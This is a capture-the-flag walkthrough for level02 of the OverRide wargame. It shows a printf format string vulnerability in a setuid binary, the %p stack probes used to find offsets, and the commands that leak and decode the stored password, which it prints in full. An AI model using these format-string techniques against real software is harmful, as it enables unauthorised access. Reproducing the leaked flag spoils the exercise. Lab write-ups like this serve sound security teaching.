# Walkthrough

## Context

### Binary info

```bash
level02@OverRide:~$ ls
level02
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: Username
--[ Password: Password
*****************************************
Username does not have access!
level02@OverRide:~$ file ./level02
./level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

An elf binary compiled for x86-64 arch with level03's privileges

### Functions

```assembly
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x0000000000400814  main
...
```

Only 'main' present

### Variables

```assembly
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
```

No global variables

### 'main' dissassembly

```assembly
(gdb) disas main
Dump of assembler code for function main:
...
   0x0000000000400818 <+4>:     sub    $0x120,%rsp
...
   0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx
...
   0x000000000040083d <+41>:    rep stos %rax,%es:(%rdi)
...
   0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx
...
   0x000000000040085d <+73>:    rep stos %rax,%es:(%rdi)
...
   0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx
...
   0x000000000040087d <+105>:   rep stos %rax,%es:(%rdi)
...
   0x00000000004008a8 <+148>:   callq  0x400700 <fopen@plt>
...
   0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax
...
   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt>
...
   0x0000000000400a8a <+630>:   callq  0x4006b0 <system@plt>
...
   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax
...
   0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>
...
End of assembler dump.
```

Please refer to the [source.c](./source.c) for better understanding

From disassembled code we can see 0x120 stack frame size and the zeroing instructions which means we have 3 buffers. First will be used as login buffer, second as actual password buffer and the last as password input buffer. Then we can how the program is reading the actual password but does nothing with it. Even 'system' call is present but(spoiler alert) we're not going to need it. And the last and the most interesting part is printf call which uses our first buffer as format string thus allowing is to use format string attack.

## Exploit

We know where the actual password stored, its on -0xa0(%rbp). This is exactly 0x30(48) bytes further then our first buffer. Let's use printf to examine the stack to calculate our first buffer start offset

### Format string buffer offset

```bash
level02@OverRide:~$ python -c "print '\xff\xff\xff\xff\xff\xff\xff\xff' + '%p|' * 30" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
��������0x7fffffffe4f0|(nil)|(nil)|0x2a2a2a2a2a2a2a2a|0x2a2a2a2a2a2a2a2a|0x7fffffffe6e8|0x1f7ff9a08|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x100000000|(nil)|0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|(nil)|0xffffffffffffffff|0x70257c70257c7025|0x257c70257c70257c| does not have access!
```

As we can see our first buffer starts at 28th segment. Let's calculate the second buffer location from it

### Actual password buffer offset

We know that the difference between first and second buffers is 0x30 bytes. Because our format string if further from printf call we need to substract this difference from first buffer offset which gives us 28 - (48 / 8) == 22.


### Reading memory where actual password is stored

We've calculated exact location of memory where actual password is stored. The length of the password is 40 bytes. So we need to read 5 segments with 8 bytes in each (5 * 8 = 40)

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password: 1
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
```

So the resulted string is our password! But it is in hex format, let's use python to decode it

### Decoding password

```python
raw_password = "0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d"
"".join([p.decode("hex")[::-1] for p in raw_password.split("0x")])
'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'
```
